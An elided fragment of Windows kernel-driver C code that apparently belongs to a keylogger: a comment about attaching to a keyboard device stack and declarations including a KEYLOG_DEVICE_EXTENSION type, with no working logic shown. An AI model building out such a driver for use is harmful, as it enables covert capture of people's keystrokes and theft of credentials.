...
/*++
  ...
  Routine Description:
  	...
  	Attach to device stack of specified keyboard device stack
...

{
	...
	OBJECT_ATTRIBUTES oaDevices;
	OBJECT_ATTRIBUTES obj_attrib;
	PDIRECTORY_BASIC_INFORMATION DirBasicInfo;
	PKEYLOG_DEVICE_EXTENSION KeylogExtension;
	PVOID pBuffer, pContext;
	ULONG retLen;
	ULONG ulDeviceContext;
